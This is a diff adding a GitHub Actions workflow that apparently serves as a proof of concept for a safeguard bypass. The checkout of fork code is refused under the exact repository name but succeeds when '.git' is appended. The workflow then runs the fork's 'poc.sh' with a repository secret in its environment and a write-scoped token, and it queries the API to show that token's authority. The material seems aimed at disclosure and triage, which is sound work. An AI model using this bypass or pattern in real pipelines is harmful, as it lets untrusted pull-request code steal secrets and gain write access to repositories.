@@ -1,0 +1,93 @@
+name: Privileged PR consumer
+
+on:
+  workflow_run:
+    workflows: ["PR source"]
+    types: [completed]
+
+permissions:
+  contents: write
+
+jobs:
+  exact-name-control:
+    if: github.event.workflow_run.event == 'pull_request'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show exact event values
+        run: |
+          echo "event_name=${GITHUB_EVENT_NAME}"
+          echo "base_repository=${GITHUB_REPOSITORY}"
+          echo "head_repository=${{ github.event.workflow_run.head_repository.full_name }}"
+          echo "head_branch=${{ github.event.workflow_run.head_branch }}"
+          echo "head_sha=${{ github.event.workflow_run.head_sha }}"
+          echo "repository_input=${{ github.event.workflow_run.head_repository.full_name }}"
+          echo "ref_input=${{ github.event.workflow_run.head_branch }}"
+          echo "allow_unsafe_pr_checkout=false"
+
+      - name: Exact fork identity is refused
+        id: exact
+        continue-on-error: true
+        uses: actions/checkout@v7
+        with:
+          repository: ${{ github.event.workflow_run.head_repository.full_name }}
+          ref: ${{ github.event.workflow_run.head_branch }}
+
+      - name: Assert the control was refused
+        run: |
+          echo "exact_name_checkout_outcome=${{ steps.exact.outcome }}"
+          test "${{ steps.exact.outcome }}" = "failure"
+          echo "CONTROL_REFUSED=true"
+
+  lowercase-dotgit-bypass:
+    if: github.event.workflow_run.event == 'pull_request'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Show exact bypass values
+        run: |
+          echo "event_name=${GITHUB_EVENT_NAME}"
+          echo "base_repository=${GITHUB_REPOSITORY}"
+          echo "head_repository=${{ github.event.workflow_run.head_repository.full_name }}"
+          echo "head_branch=${{ github.event.workflow_run.head_branch }}"
+          echo "head_sha=${{ github.event.workflow_run.head_sha }}"
+          echo "repository_input=${{ github.event.workflow_run.head_repository.full_name }}.git"
+          echo "ref_input=${{ github.event.workflow_run.head_branch }}"
+          echo "allow_unsafe_pr_checkout=false"
+
+      - name: Lowercase .git alias bypasses the refusal
+        uses: actions/checkout@v7
+        with:
+          repository: ${{ github.event.workflow_run.head_repository.full_name }}.git
+          ref: ${{ github.event.workflow_run.head_branch }}
+
+      - name: Show the fetched repository and execute fork code
+        env:
+          TRIAGE_DEMO_SECRET: ${{ secrets.TRIAGE_DEMO_SECRET }}
+        run: |
+          echo "origin_url=$(git remote get-url origin)"
+          echo "checked_out_commit=$(git rev-parse HEAD)"
+          echo "checked_out_branch=$(git branch --show-current)"
+          bash ./poc.sh
+
+      - name: Show raw Git smart-HTTP request and response headers
+        run: |
+          echo '> GET /${{ github.event.workflow_run.head_repository.full_name }}.git/info/refs?service=git-upload-pack HTTP/1.1'
+          echo '> Host: github.com'
+          echo '> Accept: */*'
+          curl -sS -D - -o /dev/null "https://github.com/${{ github.event.workflow_run.head_repository.full_name }}.git/info/refs?service=git-upload-pack"
+
+      - name: Show base-repository token authority
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          echo '> GET /repos/'"${GITHUB_REPOSITORY}"' HTTP/1.1'
+          echo '> Host: api.github.com'
+          echo '> Accept: application/vnd.github+json'
+          echo '> Authorization: Bearer [GITHUB_TOKEN masked by Actions]'
+          curl -sS -D response-headers.txt \
+            -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer ${GH_TOKEN}" \
+            "https://api.github.com/repos/${GITHUB_REPOSITORY}" \
+            -o response.json
+          sed -n '1,20p' response-headers.txt
+          jq '{full_name, private, permissions}' response.json
+
